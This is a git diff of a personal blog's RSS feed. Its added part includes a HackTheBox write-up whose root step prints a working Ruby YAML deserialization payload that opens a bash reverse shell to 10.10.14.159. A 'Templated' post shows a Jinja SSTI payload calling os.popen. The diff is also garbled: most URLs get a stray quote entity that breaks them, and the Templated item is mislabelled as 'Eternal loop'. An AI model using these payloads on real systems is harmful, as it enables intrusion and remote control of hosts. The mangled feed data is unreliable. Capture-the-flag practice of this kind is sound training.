+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        2: from /opt/update_dependencies.rb:17:in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&amp;lt;main&amp;gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        1: from /opt/update_dependencies.rb:10:in `list_from_file&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/update_dependencies.rb:10:in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;read&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;: No such file or directory @ rb_sysopen - dependencies.yml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Errno::ENOENT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This leads me to believe that i need to create this .yml file. A quick google search leads to me a &lt;a class=&#34;link&#34; href=&#34;https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;vulnerability&lt;/a&gt; about .yml deserialization and running code. Since this is run as root, i can try to get another reverse shell, this time as a root user. So i use the vulnerability as stated on the website, changing the code to open a shell. This works as intended, allowing me to login as root and get the root flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;---&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Installer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;ss&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;SpecFetcher&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;ss&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Requirement&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;ss&#34;&gt;requirements&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Package&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;TarReader&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;ss&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;BufferedIO&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;ss&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Package&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;TarReader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Entry&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;ss&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;ss&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;ss&#34;&gt;debug_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;WriteAdapter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;ss&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Gem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;RequestSet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             &lt;span class=&#34;ss&#34;&gt;sets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;WriteAdapter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;ss&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ruby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Kernel&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;ss&#34;&gt;method_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:system&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             &lt;span class=&#34;ss&#34;&gt;git_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.159/9004 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;ss&#34;&gt;method_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:resolve&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Easiest box by far.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Cat</title>
-        <link>https://www.phireheavyindustries.com/p/cat/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/cat/</link>
         <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/cat/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/cat/</guid>
         <description>&lt;p&gt;Using the &lt;strong&gt;file&lt;/strong&gt; command i can see that this is an Android Backup file, not encrypted&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -39,10 +274,10 @@
         </item>
         <item>
         <title>Eternal loop</title>
-        <link>https://www.phireheavyindustries.com/p/eternal-loop/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</link>
         <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/eternal-loop/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</guid>
         <description>&lt;p&gt;I have a zip file which opens with the standard &lt;em&gt;hackthebox&lt;/em&gt; password. This reveals another zip file inside. Atfer trying a couple of different passwords i tried the name of the zip file that i&amp;rsquo;m trying to open and it worked. This reveals another zip file which can be opened the same way. I&amp;rsquo;ve tried about 6 iterations of the same thing before giving up.&lt;/p&gt;
 &lt;p&gt;The easiest way to do this is use some sort of script which recursively opens the files.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -91,11 +326,11 @@
 </description>
         </item>
         <item>
-        <title>Templated</title>
-        <link>https://www.phireheavyindustries.com/p/templated/</link>
+        <title>Eternal loop</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</link>
         <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/templated/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/eternal-loop/</guid>
         <description>&lt;p&gt;&lt;em&gt;Can you exploit this simple mistake?&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;An easy challenge, i struggled with the #SSTI part as i wasn&amp;rsquo;t enconding the command properly. Using burpsuite to make it easier to manipulate the url i first tried:&lt;/p&gt;
 &lt;p&gt;`{{request.application.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&amp;lsquo;os&amp;rsquo;).popen(&amp;ldquo;ls&amp;rdquo;).read()}}&lt;/p&gt;
@@ -109,13 +344,11 @@
         </item>
         <item>
         <title>Timelapse</title>
-        <link>https://www.phireheavyindustries.com/p/timelapse/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/timelapse/</link>
         <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/timelapse/</guid>
-        <description>&lt;h2 id=&#34;assessment&#34;&gt;assessment&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://app.hackthebox.com/machines/Timelapse&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://app.hackthebox.com/machines/Timelapse&lt;/a&gt;&lt;/p&gt;
+        <guid>https://www.phireheavyindustries.com&#34;/p/timelapse/</guid>
+        <description>&lt;h3 id=&#34;assessment&#34;&gt;assessment&lt;/h3&gt;
 &lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 &lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
 &lt;p&gt;Has to run with -Pn&lt;/p&gt;
@@ -659,10 +892,10 @@
         </item>
         <item>
         <title>Baby Encription</title>
-        <link>https://www.phireheavyindustries.com/p/baby-encription/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/baby-encription/</link>
         <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/baby-encription/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/baby-encription/</guid>
         <description>&lt;p&gt;&lt;em&gt;You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;I cannot reverse the code for the file but i can run the samething and compare to the string that i already have.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -703,28 +936,28 @@
         </item>
         <item>
         <title>Behind the scenes</title>
-        <link>https://www.phireheavyindustries.com/p/behind-the-scenes/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/behind-the-scenes/</link>
         <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/behind-the-scenes/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/behind-the-scenes/</guid>
         <description>&lt;p&gt;After opening the binary in Ghidra, i searched for the string that is returned if i run the binary without an argument. Just below this is the flag.&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>CubeMadness1</title>
-        <link>https://www.phireheavyindustries.com/p/cubemadness1/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/cubemadness1/</link>
         <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/cubemadness1/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/cubemadness1/</guid>
         <description>&lt;p&gt;I used cheatengine to change the memory values to the maximum items i needed to catch.&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>Downgrading</title>
-        <link>https://www.phireheavyindustries.com/p/downgrading/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/downgrading/</link>
         <pubDate>Fri, 29 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/downgrading/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/downgrading/</guid>
         <description>&lt;p&gt;It took a couple of months but i finally found a battery replacement for my old but trusty &lt;a class=&#34;link&#34; href=&#34;https://www.lenovo.com/pt/pt/laptops/thinkpad/t-series/t430s&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;thinkpad t430s&lt;/a&gt;. It is a 3rd party battery, as this laptop is the better part of 10 years old. For that same reason i didn&amp;rsquo;t bother checking if there was anything blocking the use of 3rd party batteries. You can imagine my surprise when i was greeted with a message just after the bios check, stating an error with the battery not being original and that it was unable to charge. Booting to windows revealed a similar message and confirmed that the battery was indeed, not charging.&lt;/p&gt;
 &lt;p&gt;After a quick google search, it became apparent that this is a feature implemented as a security measure against low quality or fake batteries. As most things, tt is also a subject of much controversy. Fortunately, &lt;a class=&#34;link&#34; href=&#34;https://github.com/hamishcoleman/thinkpad-ec&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -734,10 +967,10 @@
         </item>
         <item>
         <title>How i work</title>
-        <link>https://www.phireheavyindustries.com/p/how-i-work/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/how-i-work/</link>
         <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/how-i-work/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/how-i-work/</guid>
         <description>&lt;p&gt;I just love trading tips with other people on what methods they use to organize their work and their life. Although i think this is a constant struggle i tend to see it as an opportunity for self improvement, and what methods can one use to achieve more efficient ways of getting stuff done.&lt;/p&gt;
 &lt;h4 id=&#34;hardware&#34;&gt;Hardware&lt;/h4&gt;
 &lt;p&gt;I have 3 computers that i use on a daily basis. One is a &lt;a class=&#34;link&#34; href=&#34;https://www.lenovo.com/pt/pt/laptops/thinkpad/t-series/t430s/]&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -777,10 +1010,10 @@
         </item>
         <item>
         <title>Sideloading</title>
-        <link>https://www.phireheavyindustries.com/p/sideloading/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/sideloading/</link>
         <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/sideloading/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/sideloading/</guid>
         <description>&lt;p&gt;After a couple of years working from home it felt good to finally return to working in a physical office with people again. Even if it&amp;rsquo;s somewhat temporary and kind of scary to be around people, it gave me a fresh perspective on work. I don&amp;rsquo;t like to admit it but i&amp;rsquo;m not that productive working exclusively from home. It remains to be seen what kind of schedule i can adopt between office and home, but for now it feels good to have a little more contact with the world.&lt;/p&gt;
 &lt;p&gt;As for work, i am now a certified &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/learn/certifications/power-bi-data-analyst-associate/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Power BI Data Analyst Associate&lt;/a&gt; and also a &lt;a class=&#34;link&#34; href=&#34;https://www.qualtrics.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -792,10 +1025,10 @@
         </item>
         <item>
         <title>Low end</title>
-        <link>https://www.phireheavyindustries.com/p/low-end/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/low-end/</link>
         <pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/low-end/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/low-end/</guid>
         <description>&lt;p&gt;I&amp;rsquo;ve tried for several years to getting some bass practice going. Last year, as the world came to a stop i thought that this would be the time to seriously invest in this hobby. For that, i researched what would be the best online course and ended up buying the &lt;a class=&#34;link&#34; href=&#34;https://www.bassbuzz.com/lessons/beginner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Beginner to Badass&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;So far it&amp;rsquo;s been a nice course to follow along, i&amp;rsquo;m currently stuck trying to play Billie Jean, by Michael Jackson.&lt;/p&gt;
@@ -815,10 +1048,10 @@
         </item>
         <item>
         <title>chuppy</title>
-        <link>https://www.phireheavyindustries.com/p/chuppy/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/chuppy/</link>
         <pubDate>Sun, 04 Oct 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/chuppy/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/chuppy/</guid>
         <description>&lt;p&gt;This is an application of the Beautiful Soup library in Python. I used it to get and store a number of posts from a well known portuguese message board. All the posts would be separated in content, user, section, url and an unique identifier.&lt;/p&gt;
 &lt;p&gt;Python is somewhat weird to use for someone like me who is more experienced in C# and Java but i can see why it has such a following for developers still learning.&lt;/p&gt;
 &lt;h3 id=&#34;main-program&#34;&gt;Main program&lt;/h3&gt;
@@ -1283,10 +1516,10 @@
         </item>
         <item>
         <title>unnamed startpage</title>
-        <link>https://www.phireheavyindustries.com/p/unnamed-startpage/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/unnamed-startpage/</link>
         <pubDate>Sun, 30 Aug 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/unnamed-startpage/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/unnamed-startpage/</guid>
         <description>&lt;p&gt;A very early idea for a responsive and dynamic start page that should open for default on the browser.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;It should list some news with RSS&lt;/li&gt;
@@ -1297,10 +1530,10 @@
         </item>
         <item>
         <title>Forged</title>
-        <link>https://www.phireheavyindustries.com/p/forged/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/forged/</link>
         <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/forged/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/forged/</guid>
         <description>&lt;p&gt;Most to-do and objetive tracking apps are either too cumbersome or too simple, both of which put me off from using them. I tend to revert to an excel file where i can name a task, prioritize it, write a few notes, set a date and routinely update a percentage to indicate how much of a certain task is done. My challenge is to build an app with a free backend so i can use it anywhere.&lt;/p&gt;
 &lt;p&gt;In short, this app should support:&lt;/p&gt;
 &lt;ul&gt;
@@ -1362,7 +1595,7 @@
 &lt;h6 id=&#34;screenshots&#34;&gt;screenshots&lt;/h6&gt;
 &lt;hr&gt;
 &lt;p&gt;login screen&lt;/p&gt;
-&lt;h2 id=&#34;loginimg2020-09-0900_59_51-windowpng&#34;&gt;&lt;img src=&#34;https://www.phireheavyindustries.com/img/2020-09-0900_59_51-Window.png&#34;
+&lt;h2 id=&#34;loginimg2020-09-0900_59_51-windowpng&#34;&gt;&lt;img src=&#34;https://www.phireheavyindustries.com"/img/2020-09-0900_59_51-Window.png&#34;
 	
 	
 	
@@ -1373,7 +1606,7 @@
 	
 &gt;&lt;/h2&gt;
 &lt;p&gt;task list screen&lt;/p&gt;
-&lt;h2 id=&#34;tasklistimg2020-09-0901_03_24-windowpng&#34;&gt;&lt;img src=&#34;https://www.phireheavyindustries.com/img/2020-09-0901_03_24-Window.png&#34;
+&lt;h2 id=&#34;tasklistimg2020-09-0901_03_24-windowpng&#34;&gt;&lt;img src=&#34;https://www.phireheavyindustries.com"/img/2020-09-0901_03_24-Window.png&#34;
 	
 	
 	
@@ -1384,7 +1617,7 @@
 	
 &gt;&lt;/h2&gt;
 &lt;p&gt;new task screen&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://www.phireheavyindustries.com/img/2020-09-0901_08_09-Window.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://www.phireheavyindustries.com"/img/2020-09-0901_08_09-Window.png&#34;
 	
 	
 	
@@ -1398,10 +1631,10 @@
         </item>
         <item>
         <title>Untitled C# AI Study</title>
-        <link>https://www.phireheavyindustries.com/p/untitled-c#-ai-study/</link>
+        <link>https://www.phireheavyindustries.com&#34;/p/untitled-c#-ai-study/</link>
         <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
         
-        <guid>https://www.phireheavyindustries.com/p/untitled-c#-ai-study/</guid>
+        <guid>https://www.phireheavyindustries.com&#34;/p/untitled-c#-ai-study/</guid>
         <description>&lt;p&gt;This is an  attempt to establish some sort of AI programming routines in order to classify strings of text as positive/negative or neutral. The objetive is to find if such a thing is possible with C#, how hard is it and what kind of resources will be needed.&lt;/p&gt;
 &lt;h3 id=&#34;used-resources&#34;&gt;Used Resources&lt;/h3&gt;
 &lt;h5 id=&#34;mlnet---machine-learning-introduction&#34;&gt;ML.NET - Machine Learning Introduction&lt;/h5&gt;
@@ -1417,10 +1650,10 @@
         </item>
         <item>
         <title>Untitled MessageBoard API</title>
